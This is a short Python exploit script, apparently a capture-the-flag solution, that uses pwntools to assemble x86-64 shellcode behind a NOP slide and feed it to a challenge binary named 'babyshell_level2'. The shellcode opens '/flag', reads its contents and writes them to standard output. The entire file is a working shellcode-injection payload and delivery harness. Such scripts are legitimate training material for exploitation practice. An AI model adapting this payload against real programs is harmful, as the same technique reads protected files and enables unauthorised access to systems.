import pwn

# Define the NOP slide length
nop_slide_length = 0x800

# NOP slide
nop_slide = b'\x90' * nop_slide_length

# Your shellcode to read the flag
flag_path = b"/flag\0"[::-1].hex()
shellcode = f"""
mov rax, 0x{flag_path}
push rax
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall
mov rdi, rax
mov rsi, rsp
mov rdx, 1000
mov rax, 0
syscall
mov rdi, 1
mov rsi, rsp
mov rdx, rax
mov rax, 1
syscall
mov rdi, 42
mov rax, 60
syscall
"""

pwn.context.update(arch="x86-64")
shellcode_bytes = pwn.asm(shellcode)

# Combine NOP slide with shellcode
payload = nop_slide + shellcode_bytes

# Use pwnlib to interact with the challenge binary
with pwn.process("/challenge/babyshell_level2") as process:
    process.readuntil("Reading 0x1000 bytes from stdin.")
    process.write(payload)
    print(process.readall().decode())

